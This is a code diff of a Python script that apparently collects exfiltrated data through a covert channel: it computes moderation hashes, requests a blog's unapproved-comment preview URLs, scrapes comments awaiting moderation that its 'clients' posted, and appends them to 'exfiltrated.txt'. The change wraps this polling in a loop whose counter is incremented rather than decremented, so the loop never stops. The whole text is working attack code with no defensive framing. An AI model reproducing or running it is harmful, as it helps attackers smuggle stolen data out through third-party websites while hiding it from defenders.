@@ -110,36 +110,40 @@ for i in range(1, 4):
 if prev_unapproved_index == 0:
     prev_unapproved_index = get_current_unapproved_index()
 
-delay_to_timeslot(time_slot)
-unapproved_index = get_current_unapproved_index()
+loop_counter = 99
+while(loop_counter > 0):
+    print("[INFO] Delaying to next timeslot. " + time_slot);
+    delay_to_timeslot(time_slot)
+    unapproved_index = get_current_unapproved_index()
 
-for client in clients:
-    timeslot_date = get_previous_valid_timeslot_date(datetime.datetime.utcnow(), client.time_slot)
-    timeslot_date = str(timeslot_date).split(".")[0]
+    for client in clients:
+        timeslot_date = get_previous_valid_timeslot_date(datetime.datetime.utcnow(), client.time_slot)
+        timeslot_date = str(timeslot_date).split(".")[0]
 
-    computed_hash = compute_moderation_hash(timeslot_date)
-    print("[INFO] Computed hash: " + computed_hash)
+        computed_hash = compute_moderation_hash(timeslot_date)
+        print("[INFO] Computed hash: " + computed_hash)
 
-    for index_offset in range(1, len(clients) + 1):
-        current_unapproved_index = prev_unapproved_index + index_offset
-        url = target_blog + sync_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + computed_hash + "&url=" + str(current_unapproved_index)
-        print("[INFO] Checking URL: " + url);
+        for index_offset in range(1, len(clients) + 1):
+            current_unapproved_index = prev_unapproved_index + index_offset
+            url = target_blog + sync_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + computed_hash + "&url=" + str(current_unapproved_index)
+            print("[INFO] Checking URL: " + url);
 
-        response_html = fetch_comments_page(url)
-        soup = BeautifulSoup(response_html, "html.parser")
+            response_html = fetch_comments_page(url)
+            soup = BeautifulSoup(response_html, "html.parser")
 
-        if soup.find("p", class_="comment-awaiting-moderation"):
-            elems = soup.find_all("div", class_="comment-content")
-            elem = elems[-1]
-            if elem and elem.string:
-                to_write = str(datetime.datetime.utcnow()) + ": "
-                to_write += "Extracted data with timeslot of " + client.time_slot + ": " + str(elem.string).strip() + "\n"
-                print("[INFO] " + to_write);
-                f = open("exfiltrated.txt", "a")
-                f.write(to_write)
-                f.close()
-                break
-        else:
-            print("[INFO] No comment for moderation for " + client.time_slot + " using index " + str(current_unapproved_index) + ". Skipping...")
+            if soup.find("p", class_="comment-awaiting-moderation"):
+                elems = soup.find_all("div", class_="comment-content")
+                elem = elems[-1]
+                if elem and elem.string:
+                    to_write = str(datetime.datetime.utcnow()) + ": "
+                    to_write += "Extracted data with timeslot of " + client.time_slot + ": " + str(elem.string).strip() + "\n"
+                    print("[INFO] " + to_write);
+                    f = open("exfiltrated.txt", "a")
+                    f.write(to_write)
+                    f.close()
+                    break
+            else:
+                print("[INFO] No comment for moderation for " + client.time_slot + " using index " + str(current_unapproved_index) + ". Skipping...")
 
-prev_unapproved_index = unapproved_index    
+    prev_unapproved_index = unapproved_index
+    loop_counter += 1
